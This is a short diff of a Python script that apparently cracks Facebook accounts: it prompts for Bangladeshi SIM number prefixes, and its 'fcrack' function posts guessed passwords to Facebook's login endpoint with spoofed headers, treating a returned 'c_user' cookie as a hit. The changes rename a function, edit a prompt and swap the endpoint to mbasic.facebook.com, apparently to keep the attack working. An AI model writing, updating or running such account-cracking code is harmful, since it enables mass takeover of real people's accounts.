@@ -1256,7 +1256,7 @@ def ali_khan():
  
 #_______
  
-def UZZAL_UZZAL():
+def Gaming_UZZAL():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1403,7 +1403,7 @@ def chos():
     print(logo)
     print('\x1b[1;91m[•] YOUR SIM CODE: ')
     lines()
-    code = input(' Your Code : ')
+    code = input(' 0177,0191,0181,016,0151,: ')
     lines()
     os.system('clear')
     print(logo)
@@ -1501,7 +1501,7 @@ def fcrack(uid,pwx,tl):
 			"sec-ch-prefers-color-scheme": "light",
  
 			'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
